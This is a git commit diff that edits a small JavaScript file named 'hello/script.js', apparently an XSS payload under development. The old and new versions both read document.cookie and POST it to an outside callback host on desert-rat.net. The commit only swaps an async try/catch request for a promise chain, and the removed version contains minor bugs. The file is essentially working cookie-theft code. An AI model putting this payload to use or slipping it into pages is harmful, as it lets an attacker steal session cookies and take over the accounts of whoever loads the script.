2d67f23ac784dce1440f12cd5b176be00f839b47
alexbacaresearch <alexbaca.research@gmail.com>
2026-09-17 15:12:40 -0700

    Trying different method of fetch

--- scripts/hello/script.js
+++ scripts/hello/script.js
@@ -5,19 +5,12 @@ console.log(document.domain);
 
 let data = document.cookie;
 
-try{
-    const response = await fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
-        method: "POST",
-        body: data
-    });
-
-    if (!response.ok) {
-        const message = 'Error with Status Code: ' + response.status;
-        throw new Error(message);
-    }
-
-    const data = await response.json();
-    console.log(data);
-} catch (error) {
-    console.log('Error: ' + err)
-}
+fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
+  method: "POST",
+  body: data,
+  headers: {
+    "Content-type": "application/json; charset=UTF-8"
+  }
+})
+  .then((response) => response.json())
+  .then((json) => console.log(json));
